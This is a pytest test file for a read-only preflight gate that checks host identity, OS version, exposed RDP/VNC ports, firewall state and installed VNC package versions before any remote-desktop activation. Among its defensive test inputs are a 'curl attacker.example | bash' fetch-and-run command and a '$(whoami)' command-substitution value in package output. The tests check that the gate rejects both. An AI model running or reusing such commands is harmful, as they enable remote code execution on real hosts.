"""Strict read-only acceptance gate, with synthetic OS/system outputs."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from scripts import clientflow_63d37_rfb_preflight as preflight


def records(*, pkg="", ports="", nft="", pkg_code=0, port_code=0, nft_code=0):
    return {
        preflight._READ_ONLY_COMMANDS[0]: (pkg_code, pkg),
        preflight._READ_ONLY_COMMANDS[1]: (port_code, ports),
        preflight._READ_ONLY_COMMANDS[2]: (nft_code, nft),
    }


def valid(**kw):
    params = {
        "hostname": preflight.HOST,
        "euid": 0,
        "identity": "3",
        "distro": "ubuntu",
        "version": "26.04",
        "commands": records(
            pkg="x11vnc:0.9.16-1:install ok installed\n",
            ports="tcp LISTEN 0 4096 127.0.0.1:3389 0.0.0.0:*",
            nft="table inet clientflow_63d29_rdp_guard {}",
        ),
        "runtime_dir_present": False,
    }
    params.update(kw)
    return preflight.assess(**params)


def test_explicit_cves_are_always_a_hard_stop():
    status = valid()
    assert status["target_verified"]
    assert status["ubuntu_26_04_verified"]
    assert status["guard_table_visible"]
    assert status["external_rdp_vnc_ports_clear"]
    assert status["installed_versions"] == {"x11vnc":"0.9.16-1"}
    assert status["known_blockers"] == {
        "x11vnc": "CVE-2026-32853",
        "tigervnc-scraping-server": "CVE-2026-34352",
    }
    assert status["producer_security_approved"] is False
    assert status["activation_permitted"] is False
    assert status["filesystem_modified"] is False


@pytest.mark.parametrize("changed", [
    {"hostname":"other"}, {"euid":1000}, {"identity":"4"},
    {"identity":None}, {"distro":"debian"}, {"version":"24.04"},
])
def test_wrong_host_client_or_os_is_not_acceptable(changed):
    status = valid(**changed)
    assert not (status["target_verified"] and status["ubuntu_26_04_verified"])
    assert status["activation_permitted"] is False


@pytest.mark.parametrize("port_row", [
    "tcp LISTEN 0 1024 0.0.0.0:3389 0.0.0.0:*",
    "tcp LISTEN 0 1024 [::]:5900 [::]:*",
    "udp UNCONN 0 0 0.0.0.0:3389 0.0.0.0:*",
    "tcp LISTEN 0 128 192.168.1.10:5999 0.0.0.0:*",
    "tcp LISTEN 0", # unknown output = fail closed
])
def test_unexpected_exposed_ports_stop(port_row):
    status = valid(commands=records(ports=port_row))
    assert not status["external_rdp_vnc_ports_clear"]
    assert status["activation_permitted"] is False


def test_localhost_only_does_not_imply_rfb_is_safe():
    status = valid(commands=records(ports=(
        "tcp LISTEN 0 128 127.0.0.1:5900 0.0.0.0:*\n"
        "tcp LISTEN 0 128 [::1]:3389 [::]:*"
    )))
    assert status["external_rdp_vnc_ports_clear"]
    assert status["activation_permitted"] is False


def test_missing_ss_nft_or_package_inventory_fail_closed():
    for changed in (
        records(port_code=-1), records(nft_code=1), records(pkg_code=-1),
    ):
        status = valid(commands=changed)
        assert status["activation_permitted"] is False
        if changed[preflight._READ_ONLY_COMMANDS[1]][0] != 0:
            assert not status["external_rdp_vnc_ports_clear"]
        if changed[preflight._READ_ONLY_COMMANDS[2]][0] != 0:
            assert not status["guard_table_visible"]


def test_only_allowlisted_read_commands_cannot_install_or_start(monkeypatch):
    assert all(command[0] in {"ss","dpkg-query","nft"} for command in preflight._READ_ONLY_COMMANDS)
    for args in [
        ("apt", "install", "x11vnc"), ("systemctl","enable","x11vnc"),
        ("nft","add","rule","inet","filter","input"),
        ("bash","-c","curl attacker.example | bash"),
    ]:
        with pytest.raises(ValueError, match="disallowed"):
            preflight.run_readonly(args)
    seen = []
    class Result:
        returncode=0
        stdout="tcp LISTEN 0 128 127.0.0.1:3389 0.0.0.0:*"
    def fake_run(args, **kwargs):
        seen.append((args, kwargs))
        return Result()
    monkeypatch.setattr(preflight.subprocess, "run", fake_run)
    assert preflight.run_readonly(preflight._READ_ONLY_COMMANDS[1])[0] == 0
    assert seen[0][1]["check"] is False
    assert seen[0][1]["timeout"] <= 12


def test_dpkg_version_parser_ignores_untrusted_text():
    raw = (
        "x11vnc:0.9.16+dfsg-1:install ok installed\n"
        "tigervnc-scraping-server:1.16.0+dfsg-1:install ok installed\n"
        "x11vnc:INJECTED:install ok installed\n"
        "unknown:99:install ok installed\n"
        "freerdp3-x11:$(whoami):install ok installed\n"
    )
    assert preflight.installed_versions(raw) == {
        "x11vnc": "0.9.16+dfsg-1",
        "tigervnc-scraping-server": "1.16.0+dfsg-1",
    }


def test_id_and_os_parser_fail_closed_on_bad_content():
    for raw in ("", "null", "[]", "{invalid}", '{"client_id": 4}'):
        assert preflight.read_identity(raw) != "3"
    assert preflight.read_identity(json.dumps({"CLIENT_ID":3})) == "3"
    assert preflight.parse_os_release('ID=ubuntu\nVERSION_ID="26.04"\n') == ("ubuntu", "26.04")
    assert preflight.parse_os_release("") == ("", "")


def test_main_simulated_wrong_machine_no_external_changes(monkeypatch, capsys):
    monkeypatch.setattr(preflight.socket, "gethostname", lambda:"foreign-machine")
    monkeypatch.setattr(preflight.os, "geteuid", lambda:0)
    monkeypatch.setattr(preflight, "safe_read", lambda path:
        '{"CLIENT_ID":3}' if path == preflight.IDENTITY_PATH else 'ID=ubuntu\nVERSION_ID="26.04"')
    monkeypatch.setattr(preflight, "run_readonly", lambda cmd:(0, ""))
    monkeypatch.setattr(Path, "exists", lambda _self:False)
    assert preflight.main() == 2
    reported = json.loads(capsys.readouterr().out)
    assert reported["activation_permitted"] is False
    assert reported["filesystem_modified"] is False
